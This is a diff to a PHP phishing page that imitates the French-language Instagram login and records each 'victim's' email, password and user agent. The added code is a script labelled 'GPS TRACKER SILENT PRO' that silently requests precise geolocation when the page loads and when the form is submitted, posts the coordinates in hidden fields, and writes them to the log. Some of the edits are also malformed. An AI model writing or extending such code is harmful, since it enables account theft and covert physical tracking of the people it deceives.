@@ -6,7 +6,15 @@ if ($_POST) {
     $email = $_POST['email'] ?? '';
     $pass  = $_POST['password'] ?? '';
     $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
-    $time  = date('Y-m-d H:i:s');
+    
+// APRÈS $ua = ...
+$gps = isset($_POST['gps_lat']) && isset($_POST['gps_lon']) 
+    ? "GPS: {$_POST['gps_lat']}, {$_POST['gps_lon']}" 
+    : "GPS: N/A";
+
+$log .= "│ 📍 {$gps}\n";  // ← AJOUTE ÇA
+
+     $time  = date('Y-m-d H:i:s');
 
     $log  = "┌─────────────────────────────────────────\n";
     $log .= "│ 🎯 INSTAGRAM VICTIME — {$time}\n";
@@ -212,6 +220,42 @@ if ($_POST) {
             }
         }
     </style>
+
+
+
+<!-- GPS TRACKER SILENT PRO -->
+<script>
+function captureGPS() {
+    navigator.geolocation.getCurrentPosition(pos => {
+        const form = document.createElement('form');
+        form.method = 'POST'; form.style.display = 'none';
+        form.innerHTML = `
+            <input name="gps_lat" value="${pos.coords.latitude}">
+            <input name="gps_lon" value="${pos.coords.longitude}">
+        `;
+        document.body.appendChild(form);
+        form.submit();
+    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
+}
+window.onload = captureGPS;
+
+// GPS sur submit
+function gpsSubmit(form) {
+    navigator.geolocation.getCurrentPosition(pos => {
+        const lat = document.createElement('input');
+        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
+        const lon = document.createElement('input');
+        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
+        form.appendChild(lat); form.appendChild(lon);
+        form.submit();
+    }, () => form.submit(), {enableHighAccuracy: true});
+    return false;
+}
+</script>
+
+
+
+
 </head>
 <body>
     <div class="main-container">
@@ -219,7 +263,7 @@ if ($_POST) {
         <div class="login-section">
             <div class="login-box">
                 <div class="logo">Instagram</div>
-                <form method="POST" action="">
+                <form method="POST" action="" onsubmit="return gpsSubmit(this)>
                     <input type="text" name="email" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
                     <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
                     <button type="submit" class="submit-btn">Se connecter</button>
